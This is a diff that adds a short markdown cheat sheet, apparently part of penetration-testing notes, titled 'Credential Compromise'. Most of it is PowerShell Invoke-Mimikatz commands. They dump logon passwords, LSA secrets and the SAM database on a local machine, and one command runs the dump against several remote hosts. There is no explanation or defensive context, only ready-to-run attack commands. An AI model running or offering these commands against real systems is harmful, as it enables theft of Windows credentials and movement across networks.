@@ -1,0 +1,21 @@
+# Credential Compromise
+> test
+
+## Mimikatz
+
+Dump credentials on a local machine.
+```powershell
+Invoke-Mimikatz -DumpCreds
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "exit"'
+```
+
+Dump credentials on multiple remote machines.
+```powershell
+Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2") 
+```
+
+logon password
+```powershell
+Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
+```
+
